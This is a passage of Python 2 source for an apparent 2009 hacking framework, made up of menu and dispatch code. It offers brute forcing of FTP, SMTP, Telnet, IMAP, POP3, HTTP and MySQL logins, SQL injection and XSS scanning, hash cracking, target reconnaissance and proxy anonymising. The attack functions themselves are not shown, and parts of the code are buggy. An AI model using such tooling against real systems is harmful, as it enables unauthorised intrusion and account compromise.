					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  SHA 512 CRACKER                           #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						algo='sha512'
						hshorb()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...") 
				
			elif cho == '6':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  BASE 64 ENCODER                           #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						jamrukh=raw_input("Enter The File Name Here : ")
						dadam = 2
						baser64p()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...") 
			elif cho == '7':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  BASE 64 DECODER                           #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						jamrukh=raw_input("Enter The File Name Here : ")
						dadam = 1
						baser64p()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...") 
			elif cho == '8':
				mdb()
			elif cho == '9':
				hlpoth()
			elif cho == '10':
				break
			elif cho == '10':
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t#################################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali               #"
				print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
				print "\t\t#  www.Ashikali.com                             #" 
				print "\t\t#  GNU General Public License                   #"
				print "\t\t#################################################"
				print "\n\t\t   Thanks For Using My Tool Hope You Like This"
				print "\t\t-------------------------------------------------"
				sys.exit(1) 
			else: 
				bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

def asia():
	global anony, myip
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	cho = '1'
	while ( cho != '7' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #"
			print "\t\t#  SUPPORT SECTION                              #"
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\tEnter 1 for Create Wordllist"
			print "\n\t\tEnter 2 for Extract IP Address From A Files"
			print "\n\t\tEnter 3 for Extract Email Address From A Files"
			print "\n\t\tEnter 4 for Extract Words From Website"
			print "\n\t\tEnter 5 For Help Of This Task "
			print "\n\t\tEnter 6 For exit from Current menu"
			print "\n\t\tEnter 7 For Exit Completly"
			cho = raw_input("\n\t\tenter which op u wana perform---> ")		
			if cho == '1':
				wordl()
			elif cho == '2':
				getipad()
			elif cho == '3':
				dumpeml()
			elif cho == '4':
				wordext()
			elif cho == '5':
				hlpoth()
			elif cho == '6':
				break
			elif cho == '7':
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t#################################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali               #"
				print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
				print "\t\t#  www.Ashikali.com                             #" 
				print "\t\t#  GNU General Public License                   #"
				print "\t\t#################################################"
				print "\n\t\t   Thanks For Using My Tool Hope You Like This"
				print "\t\t-------------------------------------------------"
				sys.exit(1) 
			else: 
				bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
def rasia():
	
	global anony, myip
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	choice= '1'
	cho ='0'
	while ( choice != '11' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t#################################################"
		print "\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
		print "\t#  Copyright (C) 2009 By Ashikali               #"
		print "\t#  BRUTE FORCING                                #" 
		print "\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
		print "\t#  www.Ashikali.com                             #" 
		print "\t#  GNU General Public License                   #"
		print "\t#################################################"
		print "\n\tEnter 1 For Bruteforcing FTP Accounts "
		print "\n\tEnter 2 for Bruteforcing SMTP" 
		print "\n\tEnter 3 for Bruteforcing Tellnet Account"
		print "\n\tEnter 4 for Briteforcing IMAP Protocol"
		print "\n\tEnter 5 For Bruteforcing NNTP Protocol"
		print "\n\tEnter 6 For Bruteforcing POP3 Accounts"
		print "\n\tEnter 7 For Bruteforcing HTTP Basic Authentication"
		print "\n\tEnter 8 For Bruteforcing MYSQL"
		print "\n\tEnter 9 For Help Of This Task "
		print "\n\tEnter 10 For for exit from Current menu"
		print "\n\tEnter 11 For Exit Completly"
		if anony == 0:
			print "\n\tYou Are using This Tool By Ip",myip	
		else:
			print "\n\tNOTE:- Currently You Are Using Proxy",anony
		choice = raw_input("\n\tEnter Your Choice Here : ")
		if choice == '1':
			ftp()
		elif choice == '2':
			smt()
		elif choice == '3':
			telb()
		elif choice == '4':
			cho ='0'
			while ( cho != '3' ):
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t##############################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali            #"
				print "\t\t#  IMAP BRUTE FORCER                         #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
				print "\t\t#  www.Ashikali.com                          #" 
				print "\t\t#  GNU General Public License                #"
				print "\t\t##############################################"
				print "\n\t\tEnter 1 For For Contineue "
				print "\n\t\tEnter 2 For Help Or Detail"
				print "\n\t\tEnter 3 For Exit From Current Menu"
				cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
				if cho == '2':
					hlphttp()	
				elif cho == '1':
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS') 
					imaperb()
				elif cho == '3':
					break
				else: 
					bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
			
		elif choice == '5':
			cho ='0'
			while ( cho != '3' ):
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t##############################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali            #"
				print "\t\t#  NNTP BRUTE FORCER                         #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
				print "\t\t#  www.Ashikali.com                          #" 
				print "\t\t#  GNU General Public License                #"
				print "\t\t##############################################"
				print "\n\t\tEnter 1 For For Contineue "
				print "\n\t\tEnter 2 For Help Or Detail"
				print "\n\t\tEnter 3 For Exit From Current Menu"
				cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
				if cho == '2':
					hlphttp()	
				elif cho == '1':
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS') 
					nntplbr()
				elif cho == '3':
					break
				else: 
					bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
			
		elif choice == '6':	
			po3()
		elif choice == '7':
			httl()
		elif choice == '8':
			mysql()	
		elif choice == '9':
			hlpbrute()
		elif choice == '10':
			break
		elif choice == '11':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\t   Thanks For Using My Tool Hope You Like This"
			print "\t\t-------------------------------------------------"
			sys.exit(1) 
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again")
		
def japan(allahname):
	
	global jense, anony, myip
	if allahname != '110':
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	choice = '1'
	while ( choice != '10' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  WEB APPLICATION SCANNING                     #" 
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\tEnter 1 For Port Scanning"
			print "\n\t\tEnter 2 For Finding SQL Injection From Website"
			print "\n\t\tEnter 3 For Finding Blind Injection From Website"
			print "\n\t\tEnter 4 For Finding Local File Includation From Website"
			print "\n\t\tEnter 5 For Finding Remote File Includation From Website"
			print "\n\t\tEnter 6 For Finding Cross Site Scripting From Website"
			print "\n\t\tEnter 7 For CGI Scanning"
			print "\n\t\tEnter 8 For Help Of This Task "
			print "\n\t\tEnter 9 for for exit from Current menu"
			print "\n\t\tEnter 10 For Exit Completly"
			if anony == 0:
				print "\n\t\tYou Are using This Tool By Ip",myip	
			else:
				print "\n\t\tNOTE:- Currently You Are Using Proxy",anony
			choice = raw_input("\n\t\tenter which op u wana perform : ")
			if choice == '1':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  PORT SCANNAR                              #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						oppor()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
			elif choice == '2':
				jense= choice
				sqlin()
			elif choice == '3':
				jense= choice
				sqlin()
			elif choice == '4' :
				jense= choice
				sqlin()
			elif choice == '5':
				jense= choice
				sqlin()
			elif choice == '6':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  XSS SCANNAR                               #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						xssi()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
			elif choice == '7':
				cgiscan()
			elif choice == '8':
				hlpweb()
			elif choice == '9':
				break
			elif choice == '10':
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t#################################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali               #"
				print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
				print "\t\t#  www.Ashikali.com                             #" 
				print "\t\t#  GNU General Public License                   #"
				print "\t\t#################################################"
				print "\n\t\t   Thanks For Using My Tool Hope You Like This"
				print "\t\t-------------------------------------------------"
				sys.exit(1) 
			else: 
				bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again")

def america(bhoombhoom):	
	if bhoombhoom != 786:
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
		sys.exit(1) 
	global anony, myip
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	choice = '1'
	while ( choice != '20' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali               #"
		print "\t\t#  GETHERING INFORMATION                        #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
		print "\t\t#  www.Ashikali.com                             #" 
		print "\t\t#  GNU General Public License                   #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 Geting IP Address Of Target"
		print "\n\t\tEnter 2 Geting SMTP Address Of Target"
		print "\n\t\tEnter 3 Identifying Distance of Target"
		print "\n\t\tEnter 4 Tracing The Target"
		print "\n\t\tEnter 5 For Server Identification"
		print "\n\t\tEnter 6 for Search Phone Numbers From Search Engines"
		print "\n\t\tEnter 7 For Search Email Address Of Targets"
		print "\n\t\tEnter 8 For Crawling Link Of The Website"
		print "\n\t\tEnter 9 For Finding Login Page Of Website"
		print "\n\t\tEnter 10 For Sub Domain Sercher"
		print "\n\t\tEnter 11 For Web Server Identification From Range Of Ip"
		print "\n\t\tEnter 12 For Sub Domain Search From IP Range"
		print "\n\t\tEnter 13 For Who Is Lookup"
		print "\n\t\tEnter 14 For Web Site Finger Printing"
		print "\n\t\tEnter 15 For Web REVERSE IP"
		print "\n\t\tEnter 16 For Web Server Monitoring"
		print "\n\t\tEnter 17 For Help Of This Task "
		print "\n\t\tEnter 18 For Exit From Current Menu"
		print "\n\t\tEnter 19 For Exit Completly"
		if anony == 0:
			print "\n\t\tYou Are using This Tool By Ip",myip	
		else:
			print "\n\t\tNOTE:- Currently You Are Using Proxy",anony
		choice = raw_input("\n\t\tEnter Your Choice Here : ")
		if choice == '1':
			pingubaba()
		elif choice == '2':
			smtenu()
		elif choice == '3':
			pathpingu()
		elif choice == '4':
			trce()
		elif choice == '5':
			foot()
		elif choice == '6':
			serp()
		elif choice == '7':
			emailget()
		elif choice == '8':
			linkerm()
		elif choice == '9':
			adf()
		elif choice == '10':
			dnsf()
		elif choice == '11':
			subserch()
		elif choice == '12':
			websevye()
		elif choice == '13':
			whoo()
		elif choice == '14':
			cho ='0'
			while ( cho != '3' ):
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t##############################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali            #"
				print "\t\t#  WEBSITE STRUCTURE FINGERPRINTING          #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
				print "\t\t#  www.Ashikali.com                          #" 
				print "\t\t#  GNU General Public License                #"
				print "\t\t##############################################"
				print "\n\t\tEnter 1 For For Contineue "
				print "\n\t\tEnter 2 For Help Or Detail"
				print "\n\t\tEnter 3 For Exit From Current Menu"
				cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
				if cho == '2':
					hlphttp()	
				elif cho == '1':
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS') 
						webfing()
				elif cho == '3':
					break
				else: 
					bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
		
		elif choice == '15':
			
			cho ='0'
			while ( cho != '3' ):
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t##############################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali            #"
				print "\t\t#  REVERSING IP                              #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
				print "\t\t#  www.Ashikali.com                          #" 
				print "\t\t#  GNU General Public License                #"
				print "\t\t##############################################"
				print "\n\t\tEnter 1 For For Contineue "
				print "\n\t\tEnter 2 For Help Or Detail"
				print "\n\t\tEnter 3 For Exit From Current Menu"
				cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
				if cho == '2':
					hlphttp()	
				elif cho == '1':
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS') 
					revrip()
				elif cho == '3':
					break
				else: 
					bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

		elif choice == '16':
			webeye()
		elif choice == '17':
			hlpfoot()
		elif choice == '18':
			break
		elif choice == '19':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\t   Thanks For Using My Tool Hope You Like This"
			print "\t\t-------------------------------------------------"
			sys.exit(1) 
		else:
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again")


def london(potatomiki): 
	global anony, myip, anony
	if potatomiki != 'stupid':
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
		sys.exit(1) 
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	choice='1'
	while (choice != '9'):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t#################################################"
		print "\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
		print "\t#  Copyright (C) 2009 By Ashikali               #"
		print "\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
		print "\t#  Main Menu                                    #"
		print "\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
		print "\t#  www.Ashikali.com                             #" 
		print "\t#  GNU General Public License                   #"
		print "\t#################################################"
		print "\n\tEnter 1 For Gethering Basic Information Of Target"
		print "\n\tEnter 2 For Evaluateing The vulnarablity Of Target"
		print "\n\tEnter 3 For Brute Forcing To The Target"
		print "\n\tEnter 4 For Encryption"
		print "\n\tEnter 5 For Attcking"
		print "\n\tEnter 6 For Supported Tools"
		print "\n\tEnter 7 For Help Or Detail"
		if anony != 0:
			print "\n\tEnter 8 For Changing, Removing Proxy Or For Exit From Current Menu"
		else:
			print "\n\tEnter 8 For Loading Proxy Or For Exit From Current Menu"
		print "\n\tEnter 9 For Exit Completly"
		if anony == 0:
			print "\n\tYou Are using This Tool By Ip",myip	
		else:
			print "\n\tNOTE:- Currently You Are Using Proxy",anony
		choice = raw_input("\n\tEnter Your Choice Here : ")
 		if choice == '1':
			bhoombhoom = 786
			america(bhoombhoom)
		elif choice == '2':
			allahname = '110'
			japan(allahname)
		elif choice == '3':
			rasia()
		elif choice == '4':
			encrbhutan()
		elif choice == '5':
			indonasia()
		elif choice == '6':
			asia()
		elif choice == '7':
			hlpindex()
		elif choice == '8':
			break
		elif choice == '9':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\t   Thanks For Using My Tool Hope You Like This"
			print "\t\t-------------------------------------------------"
			sys.exit(1) 
		else:
			
			bo=raw_input("\n\tWoops !!! Invalid Choice Press Any Key For Enter Again")	
def usaaa(wikimiki):

	global anony
	if wikimiki != 900:
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
		sys.exit(1) 
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	bol='0'
	while (bol != '9'):
		
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    HACKING ANYWAY FRAMEWORK V 1.0             #"
		print "\t\t#    PROXY SECTION                              #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tDo You want To Use Proxy ??"
		if anony != 0:
			print "\n\t\tEnter 1 For Enter In Main Menu With This Proxy"
		else:
			print "\n\t\tEnter 1 For Enter In Main Menu Without Proxy"
		print "\n\t\tEnter 2 For Get The Proxy"
		print "\n\t\tEnter 3 For Taste The Proxy"
		print "\n\t\tEnter 4 For Load The Proxy"
		if anony != 0:
			print "\n\t\tEnter 5 For RemovE Proxy"
			print "\n\t\tEnter 6 For Change Proxy"
			print "\n\t\tEnter 7 For Help Of This Task"
			print "\n\t\tEnter 8 For Exit Fom Current Menu"
			print "\n\t\tEnter 9 For Exit Completely"
		else:
			print "\n\t\tEnter 5 For Help Of This Task"
			print "\n\t\tEnter 6 For Exit Fom Current Menu"
			print "\n\t\tEnter 7 For Exit Completely"
	
		bol=raw_input("\n\t\tEnter Your Choice Here : ")
		
		if bol == '1':
			potatomiki = 'stupid'
			london(potatomiki)
		elif bol == '2':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			cho ='0'
			while ( cho != '3' ):
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t##############################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali            #"
				print "\t\t#  PROXY SPIDER                              #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
				print "\t\t#  www.Ashikali.com                          #" 
				print "\t\t#  GNU General Public License                #"
				print "\t\t##############################################"
				print "\n\t\tEnter 1 For For Contineue "
				print "\n\t\tEnter 2 For Help Or Detail"
				print "\n\t\tEnter 3 For Exit From Current Menu"
				cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
				if cho == '2':
					hlphttp()	
				elif cho == '1':
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS') 
					proxch1()
				elif cho == '3':
					break
				else: 
					bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
		elif bol == '3':
			proxtes()
		elif bol == '4':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			anonymise()
		
		elif bol == '5': 
			if anony != 0:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
